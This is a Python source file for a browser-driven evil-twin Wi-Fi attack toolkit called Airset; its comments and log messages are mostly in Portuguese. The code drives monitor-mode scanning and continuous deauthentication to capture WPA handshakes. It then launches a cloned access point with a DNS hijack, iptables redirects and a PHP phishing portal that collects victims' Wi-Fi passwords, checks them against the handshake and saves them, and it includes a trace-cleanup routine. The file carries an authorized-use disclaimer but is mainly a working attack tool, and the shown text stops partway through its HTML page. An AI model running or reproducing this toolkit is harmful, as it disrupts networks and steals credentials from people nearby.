#!/usr/bin/env python3
"""
airset-web.py — Web control panel for the Airset evil-twin toolkit (stdlib-only).

A local, zero-dependency web UI that drives the full Airset flow from the browser:
  enable monitor mode -> scan networks -> pick a target -> capture the handshake
  (airodump + deauth) -> raise the fake AP + captive portal -> watch clients and
  grab the submitted Wi-Fi password (validated against the captured handshake).

Runs the same proven toolchain as the CLI (airmon-ng, airodump-ng, aireplay-ng,
mdk4, hostapd, dnsmasq, lighttpd, aircrack-ng). Pure http.server — no Flask, no pip.

    sudo python3 airset-web.py                 # -> http://127.0.0.1:8092
    sudo python3 airset-web.py --port 9000

⚠️  AUTHORIZED USE ONLY. Only against networks you own or are explicitly
    permitted to test. Requires root, an X-less environment is fine (no xterm),
    and a Wi-Fi adapter that supports monitor mode + injection.

Binds 127.0.0.1 by default; state-changing calls need the X-Airset-Token header
issued to the page, so a random localhost page cannot drive your radio.
"""
import os
import re
import sys
import csv
import glob
import json
import time
import signal
import shutil
import secrets
import argparse
import subprocess
import threading
from pathlib import Path
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

ROOT_DIR = Path(__file__).resolve().parent
WEB_TEMPLATES = ROOT_DIR / "web_interfaces"
DUMP_PATH = Path("/tmp/TMPairset-web")
HANDSHAKE_PATH = Path("/root/handshakes")
PASSLOG_PATH = Path("/root/pwlog")
CSRF_TOKEN = secrets.token_urlsafe(32)

IP = "192.168.1.1"
RANG_IP = "192.168.1"

# ── shared state (guarded by _LOCK) ─────────────────────────────────────────
_LOCK = threading.RLock()
STATE = {
    "phase": "idle",          # idle | monitor | scanning | scanned | capturing | captured | attacking
    "iface": None,            # managed capture interface chosen
    "monitor": None,          # monitor-mode interface name
    "ap_iface": None,         # interface serving the fake AP
    "targets": [],            # scanned APs
    "target": None,           # selected AP {bssid, channel, essid, power, enc}
    "target_clients": [],     # stations associated to the selected AP
    "scanning_clients": False,# a targeted client scan is running
    "handshake": None,        # path to captured .cap
    "template": None,         # captive-portal template name
    "clients": 0,
    "attempts": 0,
    "password": None,         # captured Wi-Fi password
    "log": [],                # recent log lines
}
PROCS = {}  # name -> Popen for long-running background jobs
_VALIDATOR = {"stop": False, "thread": None}


# ── terminal colors (stdout only; web log stays plain text) ─────────────────
_USE_COLOR = sys.stdout.isatty() and os.environ.get("NO_COLOR") is None
_ANSI = {"red": "1;31", "grn": "1;32", "yel": "1;33", "blu": "1;34",
         "cyn": "1;36", "wht": "1;37", "gry": "0;90", "dim": "2",
         "bgrn": "1;92", "bcyn": "1;96"}


def _c(name, s):
    return f"\033[{_ANSI[name]}m{s}\033[0m" if _USE_COLOR else s


def _colorize(line):
    """Add ANSI color to a stdout log line based on its prefix/keywords."""
    if not _USE_COLOR:
        return line
    ts, _, msg = line.partition("  ")
    ts = _c("gry", ts)
    if msg.startswith("[+]"):
        body = "[" + _c("grn", "+") + "] " + _c("grn", msg[4:])
    elif msg.startswith("[-]"):
        body = "[" + _c("red", "-") + "] " + _c("wht", msg[4:])
    elif msg.startswith("[!]"):
        body = "[" + _c("yel", "!") + "] " + _c("yel", msg[4:])
    elif msg.startswith("!"):
        body = _c("red", msg)
    elif msg.startswith("+"):
        head, sep, rest = msg.partition(":")
        body = _c("cyn", head) + (sep + _c("dim", rest) if sep else "")
    elif "SENHA CAPTURADA" in msg:
        body = _c("bgrn", msg)
    else:
        kw = {"monitor": "grn", "handshake capturado": "grn", "senha salva": "grn",
              "scan concluído": "cyn", "clientes de": "cyn", "AP falso": "cyn",
              "restaurada": "grn", "encerrad": "yel", "sem handshake": "yel",
              "indisponível": "yel"}
        color = next((v for k, v in kw.items() if k in msg), None)
        body = _c(color, msg) if color else msg
    return f"{ts}  {body}"


def log(msg):
    line = f"{datetime.now():%H:%M:%S}  {msg}"
    with _LOCK:
        STATE["log"].append(line)
        del STATE["log"][:-200]
    print(_colorize(line), flush=True)


def run(cmd, timeout=None, check=False):
    """Run a command, return (rc, stdout+stderr)."""
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        out = (p.stdout or "") + (p.stderr or "")
        if check and p.returncode != 0:
            log(f"! comando falhou ({p.returncode}): {' '.join(cmd)}")
        return p.returncode, out
    except subprocess.TimeoutExpired:
        return 124, "timeout"
    except FileNotFoundError:
        log(f"! binário ausente: {cmd[0]}")
        return 127, "not found"


def spawn(name, cmd):
    """Start a detached background process, tracked under `name`."""
    kill(name)
    DUMP_PATH.mkdir(parents=True, exist_ok=True)
    logf = open(DUMP_PATH / f"{name}.log", "ab", buffering=0)
    p = subprocess.Popen(cmd, stdout=logf, stderr=logf, stdin=subprocess.DEVNULL,
                         start_new_session=True)
    with _LOCK:
        PROCS[name] = p
    log(f"+ {name}: {' '.join(str(c) for c in cmd)}")
    return p


def kill(name):
    with _LOCK:
        p = PROCS.pop(name, None)
    if not p or p.poll() is not None:
        return
    try:
        os.killpg(os.getpgid(p.pid), signal.SIGTERM)
        for _ in range(15):
            if p.poll() is not None:
                break
            time.sleep(0.1)
        if p.poll() is None:
            os.killpg(os.getpgid(p.pid), signal.SIGKILL)
    except (ProcessLookupError, OSError):
        pass


def killall_tools():
    for name in list(PROCS):
        kill(name)
    for tool in ("airodump-ng", "aireplay-ng", "mdk4", "hostapd", "lighttpd", "dnsmasq"):
        run(["killall", tool])
    run(["pkill", "-f", "fakedns-web"])


# ── wireless helpers ────────────────────────────────────────────────────────
def list_wifi_interfaces():
    rc, out = run(["iw", "dev"])
    ifaces = re.findall(r"Interface\s+(\S+)", out)
    return ifaces


def is_monitor(iface):
    rc, out = run(["iw", iface, "info"])
    return "type monitor" in out


def start_monitor(iface):
    run(["airmon-ng", "check", "kill"])
    rc, out = run(["airmon-ng", "start", iface])
    # airmon-ng prints "... enabled for [phy] wlanX on [phy]wlanXmon)"
    m = re.search(r"enabled.*?on\s+(?:\[[^\]]*\])?(\w+)", out)
    mon = m.group(1) if m else None
    if not mon:
        for cand in (iface + "mon", iface):
            if cand in list_wifi_interfaces() and is_monitor(cand):
                mon = cand
                break
    if not mon and is_monitor(iface):
        mon = iface
    return mon


def stop_monitor(mon):
    if mon:
        run(["airmon-ng", "stop", mon])


def stop_monitor_web():
    """Bring the monitor interface down and hand the radio back to NetworkManager."""
    mon = STATE["monitor"]
    if not mon:
        log("! nenhum monitor ativo")
        return
    # a capture running on the monitor iface must stop first
    stop_capture()
    kill("cscan")
    stop_monitor(mon)
    run(["systemctl", "restart", "NetworkManager"])
    with _LOCK:
        STATE.update(monitor=None, target_clients=[], scanning_clients=False)
        STATE["phase"] = "scanned" if STATE["targets"] else "idle"
    log(f"monitor {mon} desabilitado — interface restaurada")


# ── scan ────────────────────────────────────────────────────────────────────
def parse_scan_csv(path):
    targets = []
    try:
        text = Path(path).read_text(errors="ignore")
    except OSError:
        return targets
    # AP block is before the "Station MAC" header
    ap_block = text.split("Station MAC")[0].strip().splitlines()
    reader = csv.reader(ap_block)
    for row in reader:
        if len(row) < 14 or row[0].strip() in ("BSSID", ""):
            continue
        bssid = row[0].strip()
        if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
            continue
        essid = row[13].strip()
        targets.append({
            "bssid": bssid,
            "channel": row[3].strip(),
            "enc": row[5].strip(),
            "power": row[8].strip(),
            "essid": essid or "<hidden>",
        })
    # strongest signal first
    def pw(t):
        try:
            return int(t["power"])
        except ValueError:
            return -999
    targets.sort(key=pw, reverse=True)
    return targets


def parse_stations_csv(path, bssid):
    """Return the stations (clients) associated to `bssid` from an airodump CSV."""
    clients = []
    try:
        text = Path(path).read_text(errors="ignore")
    except OSError:
        return clients
    if "Station MAC" not in text:
        return clients
    st_block = text.split("Station MAC", 1)[1].strip().splitlines()
    reader = csv.reader(st_block)
    for row in reader:
        if len(row) < 6:
            continue
        mac = row[0].strip()
        if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", mac):
            continue
        assoc = row[5].strip()
        if assoc.lower() != bssid.lower():
            continue
        clients.append({
            "mac": mac,
            "power": row[3].strip(),
            "packets": row[4].strip(),
        })
    return clients


def do_scan_clients(seconds=10):
    """Short targeted airodump on the selected AP to list connected clients."""
    mon, t = STATE["monitor"], STATE["target"]
    if not mon or not t:
        return
    # don't fight an ongoing handshake capture / attack for the radio
    if STATE["phase"] in ("capturing", "attacking"):
        log("! scan de clientes indisponível durante captura/ataque")
        return
    with _LOCK:
        STATE["scanning_clients"] = True
    bssid, chan = t["bssid"], t["channel"]
    prefix = DUMP_PATH / ("cscan-" + bssid.replace(":", ""))
    for f in glob.glob(str(prefix) + "*"):
        try:
            os.remove(f)
        except OSError:
            pass
    spawn("cscan", ["airodump-ng", "--bssid", bssid, "-c", chan, "-w", str(prefix),
                    "--output-format", "csv", "--ignore-negative-one", mon])
    time.sleep(seconds)
    kill("cscan")
    csvs = sorted(glob.glob(str(prefix) + "-*.csv"))
    clients = parse_stations_csv(csvs[-1], bssid) if csvs else []
    with _LOCK:
        # only publish if the user hasn't switched targets meanwhile
        if STATE["target"] and STATE["target"]["bssid"] == bssid:
            STATE["target_clients"] = clients
        STATE["scanning_clients"] = False
    log(f"clientes de {t['essid']}: {len(clients)}")


def do_scan(seconds=12):
    mon = STATE["monitor"]
    if not mon:
        log("! sem interface monitor")
        return
    with _LOCK:
        STATE["phase"] = "scanning"
    for f in glob.glob(str(DUMP_PATH / "scan*")):
        try:
            os.remove(f)
        except OSError:
            pass
    spawn("scan", ["airodump-ng", "--write-interval", "1", "-w",
                   str(DUMP_PATH / "scan"), "--output-format", "csv", mon])
    time.sleep(seconds)
    kill("scan")
    csvs = sorted(glob.glob(str(DUMP_PATH / "scan-*.csv")))
    targets = parse_scan_csv(csvs[-1]) if csvs else []
    with _LOCK:
        STATE["targets"] = targets
        STATE["phase"] = "scanned"
    log(f"scan concluído: {len(targets)} rede(s)")


# ── handshake capture ───────────────────────────────────────────────────────
def do_capture():
    mon, t = STATE["monitor"], STATE["target"]
    if not mon or not t:
        log("! alvo ou monitor ausente")
        return
    with _LOCK:
        STATE["phase"] = "capturing"
        STATE["handshake"] = None
    bssid, chan = t["bssid"], t["channel"]
    prefix = DUMP_PATH / bssid.replace(":", "")
    for f in glob.glob(str(prefix) + "*"):
        try:
            os.remove(f)
        except OSError:
            pass
    spawn("dump", ["airodump-ng", "--bssid", bssid, "-c", chan, "-w",
                   str(prefix), "--ignore-negative-one", mon])
    time.sleep(2)
    spawn("deauth", ["aireplay-ng", "--deauth", "0", "-a", bssid,
                     "--ignore-negative-one", mon])
    cap = str(prefix) + "-01.cap"
    deadline = time.time() + 300
    while time.time() < deadline:
        if _VALIDATOR.get("cancel_capture"):
            break
        rc, out = run(["aircrack-ng", cap])
        if "1 handshake" in out or re.search(r"\b1 handshake\b", out):
            HANDSHAKE_PATH.mkdir(parents=True, exist_ok=True)
            saved = HANDSHAKE_PATH / f"{t['essid']}-{bssid.replace(':','')}.cap"
            run(["wpaclean", str(saved), cap])
            kill("deauth")
            kill("dump")
            with _LOCK:
                STATE["handshake"] = str(saved) if saved.exists() else cap
                STATE["phase"] = "captured"
            log(f"handshake capturado: {STATE['handshake']}")
            return
        time.sleep(5)
    kill("deauth")
    kill("dump")
    with _LOCK:
        STATE["phase"] = "scanned"
    log("captura encerrada sem handshake")


def stop_capture():
    _VALIDATOR["cancel_capture"] = True
    kill("deauth")
    kill("dump")
    time.sleep(0.5)
    _VALIDATOR["cancel_capture"] = False


# ── fake AP + captive portal ────────────────────────────────────────────────
def php_cgi_bin():
    for b in ("php8.4-cgi", "php8.3-cgi", "php8.2-cgi", "php8.1-cgi", "php-cgi"):
        p = shutil.which(b)
        if p:
            return p
    hits = sorted(glob.glob("/usr/bin/php*cgi"))
    return hits[-1] if hits else "/usr/bin/php-cgi"


def write_configs(ap_iface):
    t = STATE["target"]
    DUMP_PATH.mkdir(parents=True, exist_ok=True)
    (DUMP_PATH / "data").mkdir(exist_ok=True)

    (DUMP_PATH / "hostapd.conf").write_text(
        f"interface={ap_iface}\ndriver=nl80211\nssid={t['essid']}\nchannel={t['channel']}\n")

    (DUMP_PATH / "dnsmasq.conf").write_text(
        "port=0\n"
        "dhcp-authoritative\n"
        f"dhcp-range={RANG_IP}.100,{RANG_IP}.250,255.255.255.0,12h\n"
        f"dhcp-option=3,{IP}\n"
        f"dhcp-option=6,{IP}\n"
        f"dhcp-leasefile={DUMP_PATH}/dnsmasq.leases\n"
        "log-dhcp\n")
    (DUMP_PATH / "dnsmasq.leases").touch()

    (DUMP_PATH / "lighttpd.conf").write_text(f"""server.document-root = "{DUMP_PATH}/data/"
server.modules = ( "mod_access", "mod_alias", "mod_accesslog", "mod_fastcgi", "mod_redirect", "mod_rewrite" )
fastcgi.server = ( ".php" => (( "bin-path" => "{php_cgi_bin()}", "socket" => "/tmp/php-airset.socket" )))
server.port = 80
server.pid-file = "/var/run/lighttpd-airset.pid"
mimetype.assign = ( ".html" => "text/html", ".htm" => "text/html", ".css" => "text/css", ".js" => "application/javascript", ".png" => "image/png", ".jpg" => "image/jpeg", ".gif" => "image/gif", ".ico" => "image/x-icon" )
server.error-handler-404 = "/"
static-file.exclude-extensions = ( ".php", "~" )
index-file.names = ( "index.htm", "index.html", "index.php" )
""")

    (DUMP_PATH / "data" / "check.php").write_text(f"""<?php
error_reporting(0);
$count_file = "{DUMP_PATH}/hit.txt";
$hits = @file($count_file); $n = intval(@$hits[0]) + 1;
$fp = fopen($count_file, "w"); fputs($fp, $n); fclose($fp);
$key1 = @$_POST['key1'];
file_put_contents("{DUMP_PATH}/pwattempt.txt", $key1 . "\\n");
file_put_contents("{DUMP_PATH}/data.txt", $key1 . "\\n");
file_put_contents("{DUMP_PATH}/intento", "\\n");
$limit = time() + 30;
while (time() < $limit) {{
  if (!file_exists("{DUMP_PATH}/intento")) {{ header("Location:error.html"); break; }}
  $val = trim(@file_get_contents("{DUMP_PATH}/intento"));
  if ($val === "1") {{ header("Location:error.html"); @unlink("{DUMP_PATH}/intento"); break; }}
  if ($val === "2") {{ header("Location:success.html"); break; }}
  sleep(1);
}}
?>""")

    fakedns = DUMP_PATH / "fakedns-web"
    fakedns.write_text(f"""#!/usr/bin/env python3
import socket
IP = '{IP}'
class Q:
    def __init__(self, d):
        self.data = d; self.domain = ''
        if (d[2] >> 3) & 15 == 0:
            i = 12; ln = d[i]
            while ln != 0:
                self.domain += d[i+1:i+ln+1].decode(errors='ignore') + '.'; i += ln + 1; ln = d[i]
    def r(self, ip):
        if not self.domain: return b''
        p = self.data[:2] + b'\\x81\\x80' + self.data[4:6]*2 + b'\\x00\\x00\\x00\\x00' + self.data[12:]
        p += b'\\xc0\\x0c\\x00\\x01\\x00\\x01\\x00\\x00\\x00\\x3c\\x00\\x04' + bytes(int(x) for x in ip.split('.'))
        return p
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.bind(('', 53))
while True:
    data, addr = s.recvfrom(1024)
    s.sendto(Q(data).r(IP), addr)
""")
    os.chmod(fakedns, 0o755)


def copy_template(name):
    src = WEB_TEMPLATES / name
    dst = DUMP_PATH / "data"
    if not src.is_dir():
        log(f"! template inexistente: {name}")
        return False
    for item in src.iterdir():
        target = dst / item.name
        if item.is_dir():
            shutil.copytree(item, target, dirs_exist_ok=True)
        else:
            shutil.copy2(item, target)
    return True


def setup_routing(ap_iface):
    run(["ip", "link", "set", ap_iface, "up"])
    run(["ip", "addr", "flush", "dev", ap_iface])
    run(["ip", "addr", "add", f"{IP}/24", "dev", ap_iface])
    run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    for args in (["--flush"], ["--table", "nat", "--flush"],
                 ["--delete-chain"], ["--table", "nat", "--delete-chain"]):
        run(["iptables"] + args)
    run(["iptables", "-P", "FORWARD", "ACCEPT"])
    run(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80",
         "-j", "DNAT", "--to-destination", f"{IP}:80"])
    run(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "443",
         "-j", "DNAT", "--to-destination", f"{IP}:80"])
    run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-j", "MASQUERADE"])


def validator_loop():
    """Validate submitted passwords against the captured handshake (aircrack-ng)."""
    hs = STATE["handshake"]
    intento = DUMP_PATH / "intento"
    attempt = DUMP_PATH / "pwattempt.txt"
    data = DUMP_PATH / "data.txt"
    while not _VALIDATOR["stop"]:
        try:
            if attempt.exists():
                pw = attempt.read_text(errors="ignore").strip()
                if pw:
                    with _LOCK:
                        STATE["attempts"] += 1
                    PASSLOG_PATH.mkdir(parents=True, exist_ok=True)
                    with open(PASSLOG_PATH / f"{STATE['target']['essid']}.log", "a") as f:
                        f.write(pw + "\n")
                attempt.unlink(missing_ok=True)
            if intento.exists() and hs:
                pw = data.read_text(errors="ignore").strip() if data.exists() else ""
                rc, out = run(["aircrack-ng", "-w", str(data), hs], timeout=60)
                if pw and "Passphrase not in" not in out and ("KEY FOUND" in out or "1 handshake" in out):
                    # aircrack-ng with a single-word list: KEY FOUND means it matched
                    if "KEY FOUND" in out:
                        intento.write_text("2")
                        with _LOCK:
                            STATE["password"] = pw
                        log(f"SENHA CAPTURADA: {pw}")
                        _save_password(pw)
                    else:
                        intento.write_text("1")
                else:
                    intento.write_text("1")
            _update_clients()
        except Exception as exc:  # keep the loop alive
            log(f"! validator: {exc}")
        time.sleep(1)


def _update_clients():
    leases = DUMP_PATH / "dnsmasq.leases"
    n = 0
    if leases.exists():
        n = sum(1 for _ in leases.read_text(errors="ignore").splitlines() if _.strip())
    with _LOCK:
        STATE["clients"] = n


def _save_password(pw):
    t = STATE["target"]
    out = Path(os.path.expanduser("~")) / f"{t['essid']}-password.txt"
    out.write_text(
        f"Airset (web) | {datetime.now():%Y-%m-%d %H:%M}\n\n"
        f"SSID:   {t['essid']}\nBSSID:  {t['bssid']}\nCANAL:  {t['channel']}\n"
        f"SENHA:  {pw}\n")
    log(f"senha salva em {out}")


def start_attack(ap_iface, template):
    t = STATE["target"]
    if not t or not STATE["handshake"]:
        log("! precisa de alvo + handshake antes do ataque")
        return False
    with _LOCK:
        STATE["ap_iface"] = ap_iface
        STATE["template"] = template
        STATE["attempts"] = 0
        STATE["password"] = None
        STATE["phase"] = "attacking"
    write_configs(ap_iface)
    if not copy_template(template):
        return False
    run(["killall", "hostapd"])
    spawn("hostapd", ["hostapd", str(DUMP_PATH / "hostapd.conf")])
    time.sleep(4)
    setup_routing(ap_iface)
    run(["fuser", "-k", "53/udp", "67/udp", "80/tcp"])
    spawn("dnsmasq", ["dnsmasq", "-d", "-C", str(DUMP_PATH / "dnsmasq.conf"),
                      f"--interface={ap_iface}", "--bind-interfaces"])
    spawn("fakedns", ["python3", str(DUMP_PATH / "fakedns-web")])
    run(["lighttpd", "-f", str(DUMP_PATH / "lighttpd.conf")])
    # keep deauthing the real AP on the monitor iface, if present
    if STATE["monitor"]:
        spawn("deauth", ["aireplay-ng", "--deauth", "0", "-a", t["bssid"],
                         "--ignore-negative-one", STATE["monitor"]])
    _VALIDATOR["stop"] = False
    th = threading.Thread(target=validator_loop, daemon=True)
    _VALIDATOR["thread"] = th
    th.start()
    log(f"AP falso '{t['essid']}' no ar (iface {ap_iface}, template {template})")
    return True


def stop_attack():
    _VALIDATOR["stop"] = True
    killall_tools()
    run(["sysctl", "-w", "net.ipv4.ip_forward=0"])
    for args in (["--flush"], ["--table", "nat", "--flush"]):
        run(["iptables"] + args)
    with _LOCK:
        STATE["phase"] = "captured" if STATE["handshake"] else "idle"
    log("ataque encerrado")


def full_cleanup():
    log("[-] Limpando rastros e restaurando interface...")
    stop_attack()
    stop_capture()
    kill("cscan")
    killall_tools()

    mon = STATE["monitor"]
    base = STATE["iface"]
    if mon:
        log(f"[-] Desabilitando interface de monitoramento {mon}")
        stop_monitor(mon)

    log("[-] Limpando iptables")
    for args in (["--flush"], ["--table", "nat", "--flush"],
                 ["--delete-chain"], ["--table", "nat", "--delete-chain"]):
        run(["iptables"] + args)
    for chain in ("INPUT", "FORWARD", "OUTPUT"):
        run(["iptables", "-P", chain, "ACCEPT"])
    run(["sysctl", "-w", "net.ipv4.ip_forward=0"])

    # bring the base radio back to a clean managed state
    if base:
        log(f"[-] Restaurando interface {base}")
        run(["ip", "addr", "flush", "dev", base])
        run(["ip", "link", "set", base, "down"])
        run(["iw", base, "set", "type", "managed"])
        run(["ip", "link", "set", base, "up"])

    log("[-] Removendo arquivos temporários")
    try:
        shutil.rmtree(DUMP_PATH, ignore_errors=True)
        DUMP_PATH.mkdir(parents=True, exist_ok=True)
    except OSError:
        pass

    log("[-] Reiniciando NetworkManager")
    run(["systemctl", "restart", "NetworkManager"])

    with _LOCK:
        STATE.update(phase="idle", monitor=None, iface=None, ap_iface=None,
                     targets=[], target=None, target_clients=[],
                     scanning_clients=False, handshake=None, clients=0)
    log("[+] Limpeza concluída — interface restaurada. Obrigado por usar o Airset")


def available_templates():
    if not WEB_TEMPLATES.is_dir():
        return []
    return sorted(d.name for d in WEB_TEMPLATES.iterdir() if d.is_dir())


# ── HTTP ────────────────────────────────────────────────────────────────────
def bg(fn, *a):
    threading.Thread(target=fn, args=a, daemon=True).start()


PAGE = r"""<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">
<title>Airset Web</title><meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2064%2064%22%3E%3Cg%20fill%3D%22none%22%20stroke%3D%22%23ff3b5c%22%20stroke-width%3D%226%22%20stroke-linecap%3D%22round%22%3E%3Cpath%20d%3D%22M22%2042a14%2014%200%200%201%2020%200%22/%3E%3Cpath%20d%3D%22M14%2034a26%2026%200%200%201%2036%200%22/%3E%3Cpath%20d%3D%22M6%2026a38%2038%200%200%201%2052%200%22/%3E%3C/g%3E%3Ccircle%20cx%3D%2232%22%20cy%3D%2250%22%20r%3D%224%22%20fill%3D%22%23ff3b5c%22/%3E%3C/svg%3E">
<style>
:root{--bg:#05070c;--panel:#0b1020;--border:#7f1d2e;--red:#ff3b5c;--green:#00ff88;--cyan:#00e5ff;--yellow:#ffd166;--text:#e5e7eb;--muted:#8b949e}
*{box-sizing:border-box}body{margin:0;min-height:100vh;background:radial-gradient(circle at top left,rgba(255,59,92,.12),transparent 34%),radial-gradient(circle at bottom right,rgba(0,229,255,.12),transparent 32%),var(--bg);color:var(--text);font-family:ui-monospace,Menlo,Consolas,monospace}
a{color:var(--cyan)}
.wrap{width:calc(100% - 32px);margin:0 auto;padding:22px 0 40px}
.hero{border:1px solid var(--border);background:linear-gradient(135deg,rgba(11,16,32,.96),rgba(20,10,14,.9));border-radius:16px;padding:18px 22px;display:flex;justify-content:space-between;align-items:center;gap:16px;flex-wrap:wrap}
.title{margin:0;color:var(--red);font-size:clamp(22px,4vw,34px);letter-spacing:.14em;text-transform:uppercase;text-shadow:0 0 16px rgba(255,59,92,.4)}
.sub{margin:6px 0 0;color:var(--muted);font-size:13px}
.brand{display:flex;align-items:center;gap:16px}
.logo{width:56px;height:56px;flex:none;filter:drop-shadow(0 0 8px rgba(255,59,92,.55))}
.logo .arc,.logo .dot{fill:none;stroke:var(--red);stroke-width:6;stroke-linecap:round}
.logo .dot{fill:var(--red);stroke:none}
.logo .a1{animation:wifi 1.8s ease-in-out infinite}
.logo .a2{animation:wifi 1.8s ease-in-out .22s infinite}
.logo .a3{animation:wifi 1.8s ease-in-out .44s infinite}
@keyframes wifi{0%,55%,100%{opacity:.2}28%{opacity:1}}
@media(prefers-reduced-motion:reduce){.logo .a1,.logo .a2,.logo .a3{animation:none;opacity:1}}
.warn{border:1px solid rgba(255,209,102,.4);background:rgba(255,209,102,.06);color:var(--yellow);border-radius:12px;padding:9px 13px;margin:16px 0;font-size:12px}
.grid{display:grid;grid-template-columns:1.2fr 1fr;gap:16px;margin-top:16px}
@media(max-width:820px){.grid{grid-template-columns:1fr}}
.card{border:1px solid rgba(127,29,46,.6);background:var(--panel);border-radius:14px;padding:16px}
.card h2{margin:0 0 12px;font-size:14px;letter-spacing:.1em;text-transform:uppercase;color:var(--cyan)}
.steps{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:14px}
.step{font-size:11px;padding:4px 9px;border-radius:999px;border:1px solid #333;color:var(--muted)}
.step.on{border-color:var(--green);color:var(--green);box-shadow:0 0 10px rgba(0,255,136,.25)}
.btn{border:1px solid rgba(0,229,255,.35);background:rgba(0,229,255,.08);color:var(--text);padding:8px 12px;border-radius:10px;cursor:pointer;font:inherit;font-size:13px}
.btn:hover{border-color:var(--cyan)}.btn.g{border-color:rgba(0,255,136,.45);color:var(--green)}.btn.r{border-color:rgba(255,59,92,.5);color:var(--red)}
.btn:disabled{opacity:.4;cursor:not-allowed}
select,input{background:#05070c;border:1px solid #333;color:var(--text);border-radius:8px;padding:7px;font:inherit;font-size:13px;width:100%}
label{display:block;font-size:11px;color:var(--muted);margin:10px 0 4px;text-transform:uppercase;letter-spacing:.08em}
.row{display:flex;gap:8px;align-items:flex-end}.row>*{flex:1}
table{width:100%;border-collapse:collapse;font-size:12px}
th,td{text-align:left;padding:6px 8px;border-bottom:1px solid #1a1f2e}
th{color:var(--muted);text-transform:uppercase;font-size:10px;letter-spacing:.08em}
tr.sel{background:rgba(0,255,136,.08)}tr:hover{background:rgba(255,255,255,.03);cursor:pointer}
.stat{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:12px}
.stat div{border:1px solid #1a1f2e;border-radius:10px;padding:9px;text-align:center}
.stat span{display:block;font-size:10px;color:var(--muted);text-transform:uppercase}
.stat b{font-size:20px;color:var(--cyan)}
.pw{border:1px solid var(--green);background:rgba(0,255,136,.08);border-radius:10px;padding:12px;color:var(--green);font-size:16px;word-break:break-all}
.log{background:#04060a;border:1px solid #1a1f2e;border-radius:10px;padding:10px;height:200px;overflow:auto;font-size:11px;color:var(--muted);white-space:pre-wrap;line-height:1.5}
.dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--muted);margin-right:6px}
.dot.on{background:var(--green);box-shadow:0 0 8px var(--green)}
</style></head><body><div class="wrap">
<section class="hero"><div class="brand">
<svg class="logo" viewBox="0 0 64 64" role="img" aria-label="WiFi">
<path class="arc a1" d="M22 42a14 14 0 0 1 20 0"/>
<path class="arc a2" d="M14 34a26 26 0 0 1 36 0"/>
<path class="arc a3" d="M6 26a38 38 0 0 1 52 0"/>
<circle class="dot" cx="32" cy="50" r="4"/>
</svg>
<div><h1 class="title">Airset Web</h1>
<p class="sub">Router Social Engineering Toolkit — painel de controle local</p></div></div>
<div><span id="conn"><span class="dot"></span>fase: <b id="phase">idle</b></span>
<button class="btn r" onclick="act('cleanup')">Cleanup total</button></div></section>

<div class="warn">⚠️ Uso autorizado apenas. Só contra redes que você possui ou tem permissão explícita para testar.</div>

<div class="steps" id="steps"></div>

<div class="grid">
  <div>
    <div class="card">
      <h2>1 · Interface + Monitor</h2>
      <div class="row">
        <div><label>Interface Wi-Fi</label>
          <select id="iface"></select></div>
        <div style="flex:0 0 auto"><button class="btn g" onclick="startMon()">Monitor ON</button></div>
        <div style="flex:0 0 auto"><button class="btn r" onclick="act('monitor_stop')">Monitor OFF</button></div>
      </div>
      <p class="sub" id="monInfo"></p>
    </div>

    <div class="card" style="margin-top:14px">
      <h2>2 · Scan de redes</h2>
      <div class="row">
        <div style="flex:0 0 120px"><label>Duração (s)</label><input id="scanSecs" type="number" value="12" min="4" max="60"></div>
        <div><label>Filtrar por nome (SSID)</label><input id="filter" placeholder="ex: CLARO" oninput="applyFilter(this.value)"></div>
        <div style="flex:0 0 auto"><button class="btn" onclick="scan()">Escanear</button></div>
      </div>
      <div style="max-height:220px;overflow:auto;margin-top:10px">
      <table><thead><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>Pwr</th><th>Enc</th></tr></thead>
      <tbody id="targets"></tbody></table></div>
    </div>

    <div class="card" style="margin-top:14px">
      <h2>Clientes do alvo</h2>
      <div class="row">
        <div class="sub" id="cliInfo" style="align-self:center">Selecione um alvo para listar os dispositivos conectados.</div>
        <div style="flex:0 0 auto"><button class="btn" id="cliBtn" onclick="act('clients')">Atualizar</button></div>
      </div>
      <div style="max-height:180px;overflow:auto;margin-top:10px">
      <table><thead><tr><th>MAC do cliente</th><th>Pwr</th><th>Pacotes</th></tr></thead>
      <tbody id="clientsTbl"></tbody></table></div>
    </div>

    <div class="card" style="margin-top:14px">
      <h2>3 · Handshake</h2>
      <button class="btn" id="capBtn" onclick="act('capture')">Capturar (deauth)</button>
      <button class="btn r" onclick="act('capture_stop')">Parar</button>
      <p class="sub" id="hsInfo">Selecione um alvo na tabela acima.</p>
    </div>

    <div class="card" style="margin-top:14px">
      <h2>4 · AP falso + Captive Portal</h2>
      <div class="row">
        <div><label>Interface do AP</label><select id="apIface"></select></div>
        <div><label>Template</label><select id="tpl"></select></div>
      </div>
      <div style="margin-top:12px">
        <button class="btn g" id="atkBtn" onclick="attack()">Iniciar ataque</button>
        <button class="btn r" onclick="act('attack_stop')">Parar ataque</button>
      </div>
    </div>
  </div>

  <div>
    <div class="card">
      <h2>Status ao vivo</h2>
      <div class="stat">
        <div><span>Clientes</span><b id="clients">0</b></div>
        <div><span>Tentativas</span><b id="attempts">0</b></div>
        <div><span>Handshake</span><b id="hsBadge">—</b></div>
        <div><span>AP</span><b id="apBadge">off</b></div>
      </div>
      <div id="pwBox" hidden><label>Senha capturada</label><div class="pw" id="pw"></div></div>
      <div id="tgtBox" style="margin-top:10px" class="sub"></div>
    </div>
    <div class="card" style="margin-top:14px">
      <h2>Log</h2>
      <div class="log" id="log"></div>
    </div>
